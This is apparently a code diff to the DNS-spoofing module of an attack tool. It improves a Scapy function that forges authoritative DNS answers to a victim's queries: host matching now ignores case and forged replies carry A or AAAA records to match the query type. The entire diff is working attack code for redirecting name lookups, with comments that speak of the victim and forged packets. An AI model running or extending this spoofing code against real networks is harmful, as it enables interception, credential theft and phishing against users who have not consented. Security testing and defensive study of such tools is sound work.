@@ -16,14 +16,33 @@ import logging
 log = logging.getLogger("reforge.dns")
 
 
+_A = 1
+_AAAA = 28
+
+
 def _match(qname: str, hostmap: dict[str, str]) -> str | None:
     qname = qname.rstrip(".").lower()
-    if qname in hostmap:
-        return hostmap[qname]
-    for pattern, ip in hostmap.items():
-        if "*" in pattern and fnmatch.fnmatch(qname, pattern.lower()):
+    # lowercase keys so a mixed-case map entry still matches the exact lookup
+    # (not only via the wildcard branch)
+    lowered = {k.rstrip(".").lower(): v for k, v in hostmap.items()}
+    if qname in lowered:
+        return lowered[qname]
+    for pattern, ip in lowered.items():
+        if "*" in pattern and fnmatch.fnmatch(qname, pattern):
             return ip
-    return hostmap.get("*")
+    return lowered.get("*")
+
+
+def _record_type(qtype: int, ip: str) -> str | None:
+    """The DNSRR type to answer with, or None if the query type can't be
+    satisfied by the mapped address (a type mismatch is discarded by the
+    resolver, so don't waste a forged packet on it)."""
+    is_v6 = ":" in ip
+    if qtype == _AAAA:
+        return "AAAA" if is_v6 else None
+    if qtype == _A:
+        return "A" if not is_v6 else None
+    return None
 
 
 def spoof_response(query_pkt, hostmap: dict[str, str], ttl: int = 300):
@@ -46,12 +65,17 @@ def spoof_response(query_pkt, hostmap: dict[str, str], ttl: int = 300):
     if not ip:
         return None
 
+    # answer the type the victim actually asked for (A vs AAAA); skip mismatches
+    rr_type = _record_type(int(getattr(qd0, "qtype", _A)), ip)
+    if rr_type is None:
+        return None
+
     ipl = query_pkt[IP]
     udpl = query_pkt[UDP]
     resp = (IP(src=ipl.dst, dst=ipl.src)
             / UDP(sport=udpl.dport, dport=udpl.sport)
             / DNS(id=dns.id, qr=1, aa=1, qd=dns.qd,
-                  an=DNSRR(rrname=qd0.qname, type="A", ttl=ttl, rdata=ip)))
+                  an=DNSRR(rrname=qd0.qname, type=rr_type, ttl=ttl, rdata=ip)))
     return resp
 
 
